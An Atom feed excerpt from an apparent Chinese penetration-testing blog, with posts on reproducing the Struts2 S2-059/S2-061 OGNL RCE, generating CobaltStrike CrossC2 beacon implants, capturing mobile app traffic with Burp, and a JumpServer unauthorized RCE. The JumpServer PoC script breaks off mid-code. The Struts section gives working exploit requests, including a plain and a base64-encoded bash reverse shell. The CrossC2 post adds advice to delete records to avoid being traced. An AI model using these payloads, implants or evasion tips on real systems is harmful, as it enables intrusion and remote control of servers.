src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210220232131.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;了解了解&lt;/p&gt;</summary>
    
    
    
    
    <category term="红蓝对抗" scheme="https://hack-for.fun/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>漏洞复现：S2-059&amp;061远程代码执行漏洞(CVE-2019-0230&amp;CVE-2020-17430)</title>
    <link href="https://hack-for.fun/9316.html"/>
    <id>https://hack-for.fun/9316.html</id>
    <published>2021-02-17T16:45:37.000Z</published>
    <updated>2021-02-18T02:32:37.278Z</updated>
    
    <content type="html"><![CDATA[<p>Struts2的洞一般都是OGNL表达式注入，以及对其沙盒绕过</p><a id="more"></a><h1 id="S2-059"><a href="#S2-059" class="headerlink" title="S2-059"></a>S2-059</h1><p>Apache Struts框架, 会对某些特定的标签的属性值，比如id属性进行<strong>二次解析</strong>，所以攻击者可以传递将在呈现标签属性时再次解析的OGNL表达式，造成OGNL表达式注入。从而可能造成远程执行代码。</p><p>影响版本: Struts 2.0.0 - Struts 2.5.20</p><p>阿里云VPS 会自带阿里云盾，所以每一台阿里云VPS，都是阿里云的蜜罐了么。。自己复现都么法，自己把自己waf了，网站都打不开。</p><p>访问 <code>http://your-ip:8080/?id=%25%7B233*233%7D</code>，可以发现233*233的结果被解析到了id属性中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;touch /tmp/success&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res1 = requests.post(url, data=data1)</span><br><span class="line"><span class="comment"># print(res1.text)</span></span><br><span class="line">res2 = requests.post(url, data=data2)</span><br><span class="line"><span class="comment"># print(res2.text)</span></span><br></pre></td></tr></table></figure><h1 id="S2-061"><a href="#S2-061" class="headerlink" title="S2-061"></a>S2-061</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>Vulhub:</p><p><a href="https://github.com/vulhub/vulhub/tree/master/struts2/s2-061">https://github.com/vulhub/vulhub/tree/master/struts2/s2-061</a></p><p>Struts2: </p><p>2.5.25 </p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>此次漏洞只是S2-059修复的一个绕过，并且本次利用的核心类<code>org.apache.commons.collections.BeanMap</code>在commons-collections-x.x.jar包中，但是在官方的最小依赖包中并没有包含这个包。所以即使扫到了支持OGNL表达式的注入点，如果没有使用这个依赖包，也还是没办法进行利用</p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p><strong>S2-061是对S2-059的绕过</strong>，Struts2官方对S2-059的修复方式是<strong>加强OGNL表达式沙盒</strong>，而S2-061绕过了该沙盒。</p><p>该漏洞影响版本范围是Struts 2.0.0到Struts 2.5.25。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC 1"></a>POC 1</h3><p>POST请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">boundary&#x3D;----WebKitFormBoundary0qcU8KvOhouvJWrH</span><br><span class="line">Content-Length: 829</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary0qcU8KvOhouvJWrH</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;id&quot;</span><br><span class="line"></span><br><span class="line">%&#123;(#instancemanager&#x3D;#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack&#x3D;#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean&#x3D;#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context&#x3D;#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc&#x3D;#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset&#x3D;#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist&#x3D;#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;id&quot;)).(#execute&#x3D;#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;</span><br><span class="line">------WebKitFormBoundary0qcU8KvOhouvJWrH--</span><br></pre></td></tr></table></figure><p>执行命令在 <code>(#arglist.add(&quot;id&quot;)).</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210218103019.png"></p><h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC 2"></a>POC 2</h3><p>反弹shell</p><p>使用bash反弹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx.xxx.xxx.xxx&#x2F;1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210218103020.png"></p><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><p>Java 漏洞利用，常常需要注意编码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Length: 918</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;id&quot;</span><br><span class="line"></span><br><span class="line">%&#123;(#instancemanager&#x3D;#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack&#x3D;#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean&#x3D;#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context&#x3D;#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc&#x3D;#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset&#x3D;#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist&#x3D;#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)).(#execute&#x3D;#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF-</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210218103021.png"></p><p>还有很多，不一一复现了。一个回显用来验证，一个反弹shell用来利用。可能实战遇到了，要么很好利用，要么就是各种WAF，RASP…</p><h1 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h1><p><a href="https://xz.aliyun.com/t/8689">https://xz.aliyun.com/t/8689</a></p><p><a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-061/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/struts2/s2-061/README.zh-cn.md</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Struts2的洞一般都是OGNL表达式注入，以及对其沙盒绕过&lt;/p&gt;</summary>
    
    
    
    
    <category term="漏洞复现" scheme="https://hack-for.fun/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Struts2" scheme="https://hack-for.fun/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>CobaltStrike：CrossC2相关知识</title>
    <link href="https://hack-for.fun/67f2.html"/>
    <id>https://hack-for.fun/67f2.html</id>
    <published>2021-01-20T13:48:21.000Z</published>
    <updated>2021-01-20T17:05:05.392Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>今天和亮亮还有豪哥提了下CS，发现我连CrossC2都还没装。。。有时候真心建议去看官方文档，别去找教程，看了几个教程全tm都是坑。。。</p></blockquote><a id="more"></a><p>具体介绍看下面</p><p><a href="https://github.com/gloxec/CrossC2/blob/cs4.1/README_zh.md">https://github.com/gloxec/CrossC2/blob/cs4.1/README_zh.md</a></p><p>一些限制，要cs4.1及以上。</p><ul><li>Only CS 4.x (&gt;=4.1) version is supported, lower versions will no longer be supported.</li></ul><p>简单说，CrossC2就是一个跨平台的上线，Linux、MacOS、iOS、Android。</p><blockquote><p>CrossC2 framework - 生成CobaltStrike的跨平台beacon</p></blockquote><ul><li>由于 Cross C2目前只支持HTTPS Beacon，所以在Listenrs中选择HTTPS进行监听，<br>服务端开启监听 windows/beacon_https/reverse_https 类型的beacon（强制HTTPS</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210120221604.png"></p><p>如何使用？</p><ol><li>将s端的<code>.cobaltstrike.beacon_keys</code> 下载到c端目录下。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121005951.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210120224454.png"></p><ol start="2"><li>将CrossC2.cna、genCrossC2.Linux两个文件复制到Cobalt Strike服务端（必须处于同一目录）</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210120233334.png"></p><p>根据目标客户端，利用相应的CrossC2文件，生成上线文件（可执行文件，需要给x权限）</p><p>测试：以kali来测试。</p><p>生成上线可执行文件(木马)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[usage]: .&#x2F;genCrossC2.Linux [host] [port] [getURI] [postURI] [platform] [arch] [outputFileName]</span><br><span class="line"></span><br><span class="line">         -platform        &#39;MacOS&#39; &#x2F; &#39;Linux&#39;</span><br><span class="line">         -arch            &#39;x86&#39; &#x2F; &#39;x64&#39;</span><br><span class="line"></span><br><span class="line">[ex]:    .&#x2F;genCrossC2.Linux 10.10.10.10 40443 null null Linux x64 C2</span><br></pre></td></tr></table></figure><blockquote><p>上面这个都是老方法，非常不推荐。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121004040.png"></p><p>要记得给<code>genCrossC2.MacOS</code>  x 权限，不然没办法。。我傻逼，在这里都能卡住。</p><p>然后在kali 上运行可执行文件(木马)</p><ul><li>拿到shell之后，上传生成的可执行文件，然后运行</li><li>Stageless，命令行curl远程加载即可，不过这样可能会注意一下删除记录，否则如意被溯源</li></ul><p>我还问了下long716师傅，为什么Stageless 这种不行，结果我换个端口就好了。傻逼了</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121005007.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121003919.png"></p><p>成功上线。</p><p>当然不仅仅这些。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;今天和亮亮还有豪哥提了下CS，发现我连CrossC2都还没装。。。有时候真心建议去看官方文档，别去找教程，看了几个教程全tm都是坑。。。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="CobaltStrike" scheme="https://hack-for.fun/tags/CobaltStrike/"/>
    
    <category term="渗透测试" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>必会技术：MacOS下如何对移动端APP抓包测试</title>
    <link href="https://hack-for.fun/84a4.html"/>
    <id>https://hack-for.fun/84a4.html</id>
    <published>2021-01-20T06:43:57.000Z</published>
    <updated>2021-01-20T17:24:29.446Z</updated>
    
    <content type="html"><![CDATA[<p>常规渗透测试时，肯定不可能少对移动端APP、微信小程序等进行测试。这一块，还停留在最基础的水平。</p><a id="more"></a><p>相关的资料：</p><ul><li><p><a href="http://jianlei.github.io/archives/c4bd228f.html%EF%BC%88%E4%BC%A0%E7%BB%9F%E6%8A%93%E5%8C%85%E6%96%B9%E6%B3%95%EF%BC%8C%E9%9C%80%E8%A6%81%E6%89%8B%E6%9C%BA%E4%B8%8B%E8%BD%BDapp%EF%BC%8C%E6%89%8B%E6%9C%BA%E5%92%8C%E7%94%B5%E8%84%91%E5%9C%A8%E5%90%8C%E4%B8%80%E4%B8%AAWiFi%E4%B8%8B%EF%BC%8C%E7%84%B6%E5%90%8E%E6%89%8B%E6%9C%BA%E7%AB%AF%E8%BF%98%E8%A6%81%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86%E4%B8%BABurpSuite%E7%9A%84%E4%BB%A3%E7%90%86IP%EF%BC%89">http://jianlei.github.io/archives/c4bd228f.html（传统抓包方法，需要手机下载app，手机和电脑在同一个WiFi下，然后手机端还要设置代理为BurpSuite的代理IP）</a></p></li><li><p><a href="https://www.cnblogs.com/Xor0ne/articles/13729697.html%EF%BC%88Proxifier">https://www.cnblogs.com/Xor0ne/articles/13729697.html（Proxifier</a> 转发模拟器流量到bp，Windows平台比较友好，奈何我是MacOS）</p></li><li><p><a href="http://sunu11.com/2019/03/31/%E8%A7%A3%E5%86%B3android%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%97%AE%E9%A2%98/">http://sunu11.com/2019/03/31/%E8%A7%A3%E5%86%B3android%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%97%AE%E9%A2%98/</a> （用的网易MuMu，但是因为上面问题，还是转向了实体机)</p></li><li><p><a href="https://www.cnblogs.com/iamstudy/articles/android_begin_start.html">https://www.cnblogs.com/iamstudy/articles/android_begin_start.html</a> (L3m0n师傅的，不过偏向逆向工程的一些东西，跟着来一遍吧，总会遇到的)</p></li><li><p><a href="https://www.cnblogs.com/wjrblogs/p/13683812.html">https://www.cnblogs.com/wjrblogs/p/13683812.html</a></p></li></ul><h1 id="相关技术要点"><a href="#相关技术要点" class="headerlink" title="相关技术要点"></a>相关技术要点</h1><p>参考资料3.</p><p>1、远古时期，无ssl证书，明文传输数据。<br>2、采用ssl证书加密，但未使用做ssl Pining技术<br>3、采用ssl证书加密，但使用了ssl pining技术。<br>4、双向加密</p><h1 id="MacOS下的模拟器"><a href="#MacOS下的模拟器" class="headerlink" title="MacOS下的模拟器"></a>MacOS下的模拟器</h1><ul><li>蓝叠。之前下载过，但是打不开。</li><li>网易MuMu</li></ul><h1 id="adb"><a href="#adb" class="headerlink" title="adb"></a>adb</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew  install cask android-platform-tools</span><br></pre></td></tr></table></figure><p>db连接，<strong>mac下网易mumu端口是5555</strong>，windows下是7555</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">windows下:</span><br><span class="line">adb connect 127.0.0.1:7555</span><br><span class="line">adb shell</span><br><span class="line"></span><br><span class="line">mac下:</span><br><span class="line">adb shell</span><br></pre></td></tr></table></figure><h1 id="jeb"><a href="#jeb" class="headerlink" title="jeb"></a>jeb</h1><p>配合 adb 来动态调试的。</p><p>首先通过字符串搜索，定位到某个位置，command + b下断点。<br>在mumu上运行apk，然后attach</p><h1 id="模拟器-端口"><a href="#模拟器-端口" class="headerlink" title="模拟器/端口"></a>模拟器/端口</h1><p>下面貌似都是Windows下的，没实验过。</p><ul><li>夜神安卓模拟器 62001  </li><li>逍遥安卓模拟器 21503  </li><li>BlueStacks(蓝叠安卓模拟器) 5555  </li><li>雷电安卓模拟器 5555  </li><li>天天安卓模拟器 6555  </li><li>网易MuMu(安卓模拟器) 7555  </li><li>安卓模拟器大师 54001</li></ul><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="1-查看本机IP"><a href="#1-查看本机IP" class="headerlink" title="1. 查看本机IP"></a>1. 查看本机IP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> ✘ m0nk3y@🍎  ~&#x2F;tools&#x2F;Android  ifconfig en0</span><br><span class="line">en0: flags&#x3D;8963&lt;UP,BROADCAST,SMART,RUNNING,PROMISC,SIMPLEX,MULTICAST&gt; mtu 1500</span><br><span class="line">options&#x3D;400&lt;CHANNEL_IO&gt;</span><br><span class="line">ether 3c:22:fb:e1:41:53</span><br><span class="line">inet 192.168.1.6 netmask 0xffffff00 broadcast 192.168.1.255</span><br><span class="line">nd6 options&#x3D;201&lt;PERFORMNUD,DAD&gt;</span><br><span class="line">media: autoselect</span><br><span class="line">status: active</span><br></pre></td></tr></table></figure><p>我这里为 192.168.1.6</p><h2 id="2-设置Burpsuite的代理"><a href="#2-设置Burpsuite的代理" class="headerlink" title="2. 设置Burpsuite的代理"></a>2. 设置Burpsuite的代理</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121012306.png"></p><h2 id="3-设置MuMu模拟器中的WiFi代理"><a href="#3-设置MuMu模拟器中的WiFi代理" class="headerlink" title="3. 设置MuMu模拟器中的WiFi代理"></a>3. 设置MuMu模拟器中的WiFi代理</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121012307.png"></p><h2 id="4-安装BurpSuite证书"><a href="#4-安装BurpSuite证书" class="headerlink" title="4. 安装BurpSuite证书"></a>4. 安装BurpSuite证书</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121012308.png"></p><p>安卓系统无法安装 <code>.der</code> 后缀的证书，所以需要用文件管理器更改下载的证书后缀为 <code>.cer</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121012309.png"></p><p>安装过程中，设置解锁pin码，我设置为了6666。</p><h2 id="5-用BurpSuite抓包测试"><a href="#5-用BurpSuite抓包测试" class="headerlink" title="5. 用BurpSuite抓包测试"></a>5. 用BurpSuite抓包测试</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210121012310.png"></p><p>可以看到http/https的包都能抓到了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;常规渗透测试时，肯定不可能少对移动端APP、微信小程序等进行测试。这一块，还停留在最基础的水平。&lt;/p&gt;</summary>
    
    
    
    
    <category term="渗透测试" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>漏洞复现：JumpServer WebSocksts Unauthorized RCE</title>
    <link href="https://hack-for.fun/97f2.html"/>
    <id>https://hack-for.fun/97f2.html</id>
    <published>2021-01-18T13:35:34.000Z</published>
    <updated>2021-01-21T08:15:32.350Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h1><p><strong>JumpServer</strong> 是全球首款完全开源的堡垒机, 使用 GNU GPL v2.0 开源协议, 是符合 4A 的专业运维审计系统。 使用 Python / Django 进行开发, 遵循 Web 2.0 规范, 配备了业界领先的 Web Terminal 解决方案, 交互界面美观、用户体验好。 采纳分布式架构, 支持多机房跨区域部署, 中心节点提供 API, 各机房部署登录节点, 可横向扩展、无并发访问限制。</p><p>由于<strong>JumpServer</strong>程序中连接websocket的接口未做授权限制，导致攻击者可<strong>构造恶意请求获取服务器敏感信息，通过敏感信息中的相关参数，可构造请求获取相应token</strong>，进而可通过相关API操作来执行任意命令。</p><h1 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h1><p>参考这位师傅的文章：<a href="https://www.o2oxy.cn/2921.html">https://www.o2oxy.cn/2921.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User    Check   ........................ [ OK ]</span><br><span class="line">OS      Check   ........................ [ ERROR ] 操作系统类型版本不符合要求，请使用 CentOS 7</span><br><span class="line">CPU     Check   ........................ [ ERROR ] CPU 小于 2核，JumpServer 所在机器的 CPU 需要至少 2核</span><br><span class="line">Memory  Check   ........................ [ ERROR ] 内存小于 8G，JumpServer 所在机器的内存需要至少 8G</span><br></pre></td></tr></table></figure><p>2核8G。。之前傻逼了，以为CentOS安装好后，重启成为命令行模式，以为是错的，结果这是以为没有安装gui。</p><p><a href="https://zhuanlan.zhihu.com/p/126601630">https://zhuanlan.zhihu.com/p/126601630</a></p><p>CentOS 7 ：<a href="https://mirrors.ustc.edu.cn/centos/7.9.2009/isos/x86_64/">https://mirrors.ustc.edu.cn/centos/7.9.2009/isos/x86_64/</a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="公开POC-1"><a href="#公开POC-1" class="headerlink" title="公开POC 1"></a>公开POC 1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># import requests</span></span><br><span class="line"><span class="comment"># import json</span></span><br><span class="line"><span class="comment"># data=&#123;&quot;user&quot;:&quot;4320ce47-e0e0-4b86-adb1-675ca611ea0c&quot;,&quot;asset&quot;:&quot;ccb9c6d7-6221-445e-9fcc-b30c95162825&quot;,&quot;system_user&quot;:&quot;79655e4e-1741-46af-a793-fff394540a52&quot;&#125;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># url_host=&#x27;http://192.168.1.73:8080&#x27;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># def get_token():</span></span><br><span class="line"><span class="comment">#     url = url_host+&#x27;/api/v1/users/connection-token/?user-only=1&#x27;</span></span><br><span class="line"><span class="comment">#     url =url_host+&#x27;/api/v1/authentication/connection-token/?user-only=1&#x27;</span></span><br><span class="line"><span class="comment">#     response = requests.post(url, json=data).json()</span></span><br><span class="line"><span class="comment">#     print(response)</span></span><br><span class="line"><span class="comment">#     ret=requests.get(url_host+&#x27;/api/v1/authentication/connection-token/?token=%s&#x27;%response[&#x27;token&#x27;])</span></span><br><span class="line"><span class="comment">#     print(ret.text)</span></span><br><span class="line"><span class="comment"># get_token()</span></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">url = <span class="string">&quot;/api/v1/authentication/connection-token/?user-only=None&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 向服务器端发送认证后的消息</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">send_msg</span>(<span class="params">websocket,_text</span>):</span></span><br><span class="line">    <span class="keyword">if</span> _text == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">        print(<span class="string">f&#x27;you have enter &quot;exit&quot;, goodbye&#x27;</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.close(reason=<span class="string">&quot;user exit&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">await</span> websocket.send(_text)</span><br><span class="line">    recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">    print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端主逻辑</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main_logic</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    print(<span class="string">&quot;#######start ws&quot;</span>)</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(target) <span class="keyword">as</span> websocket:</span><br><span class="line">        recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line">        resws=json.loads(recv_text)</span><br><span class="line">        id = resws[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">        print(<span class="string">&quot;get ws id:&quot;</span>+id)</span><br><span class="line">        print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;init ws&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line">        inittext = json.dumps(&#123;<span class="string">&quot;id&quot;</span>: id, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_INIT&quot;</span>, <span class="string">&quot;data&quot;</span>: <span class="string">&quot;&#123;\&quot;cols\&quot;:164,\&quot;rows\&quot;:17&#125;&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">await</span> send_msg(websocket,inittext)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">            recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">            print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;exec cmd: ls&quot;</span>)</span><br><span class="line">        cmdtext = json.dumps(&#123;<span class="string">&quot;id&quot;</span>: id, <span class="string">&quot;type&quot;</span>: <span 